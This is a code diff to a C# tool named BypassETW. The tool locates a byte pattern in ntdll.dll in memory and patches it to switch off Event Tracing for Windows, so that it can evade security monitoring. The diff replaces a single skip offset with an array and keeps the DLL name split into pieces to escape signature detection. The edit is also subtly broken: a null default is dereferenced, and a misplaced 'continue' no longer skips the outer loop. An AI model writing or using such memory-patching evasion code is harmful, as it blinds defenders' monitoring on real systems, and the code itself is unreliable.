@@ -57,7 +57,7 @@ namespace BypassETW
             return is64Bit;
         }
 
-        private static IntPtr FindAddress(IntPtr address, byte[] egg, int miss_num = 0)
+        private static IntPtr FindAddress(IntPtr address, byte[] egg, int[] miss_nums = null)
         {
             while (true)
             {
@@ -65,14 +65,18 @@ namespace BypassETW
 
                 while (true)
                 {
-                    if (miss_num != 0)
+                    if (miss_nums.Length != 0)
                     {
-                        if (miss_num == count)
+                        for (int i = 0; i < miss_nums.Length; i++)
                         {
-                            count++;
-                            address = IntPtr.Add(address, 1);
-                            continue;
+                            if (miss_nums[i] == count)
+                            {
+                                count++;
+                                address = IntPtr.Add(address, 1);
+                                continue;
+                            }
                         }
+
                     }
 
                     // IntPtr ori_Addr = address;
@@ -92,7 +96,7 @@ namespace BypassETW
         }
 
 
-        private static void MemoryPatch(string dllname, string funcname, byte[] egg, byte[] patch, int miss_num = 0)
+        private static void MemoryPatch(string dllname, string funcname, byte[] egg, byte[] patch, int[] miss_nums = null)
         {     
             uint Oldprotect;
             uint Newprotect;
@@ -102,9 +106,9 @@ namespace BypassETW
             IntPtr PatchAddr = IntPtr.Zero;
             // byte temp = Marshal.ReadByte(funcAddr, 1);
 
-            if (miss_num != 0)
+            if (miss_nums.Length != 0)
             {
-                PatchAddr = FindAddress(funcAddr, egg, miss_num);
+                PatchAddr = FindAddress(funcAddr, egg, miss_nums);
             }
             else
             {
@@ -133,7 +137,8 @@ namespace BypassETW
             else
             {
                 // Console.WriteLine("x86");
-                MemoryPatch("ntd" + "ll.d" + "ll", "RtlInitializeResource", egg_x86, patch_code_x86, 17);
+                int[] miss_nums = { 15, 16, 17 };
+                MemoryPatch("ntd" + "ll.d" + "ll", "RtlInitializeResource", egg_x86, patch_code_x86, miss_nums);
             }
         }
 
